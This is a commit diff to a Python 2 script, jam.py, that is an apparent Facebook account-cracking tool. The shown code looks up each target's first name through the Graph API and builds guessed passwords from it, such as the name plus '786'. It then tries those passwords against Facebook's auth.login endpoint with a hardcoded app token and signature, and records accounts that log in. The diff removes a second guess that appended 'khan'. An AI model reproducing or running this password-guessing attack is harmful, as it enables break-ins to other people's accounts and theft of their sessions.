580f8338a72e6d91902f368fbd9eb7d077dddb4f
mishi786 <68304964+mishi786@users.noreply.github.com>
2020-11-12 00:41:00 +0500

    Update jam.py

--- jam.py
+++ jam.py
@@ -341,21 +341,14 @@ def pilih_super():
 										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass7
 										oks.append(user+pass7)
 									else:
+										a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+										b = json.loads(a.text)
 										pass8 = b['first_name'] + '786'
 										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									        q = json.load(data)
 									        if 'access_token' in q:
 										        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass8
 										        oks.append(user+pass8)
-										else:
-											a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-											b = json.loads(a.text)
-											pass9 = b['first_name'] + 'khan'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass9
-												oks.append(user+pass9)  
 															
 		except:
 			pass
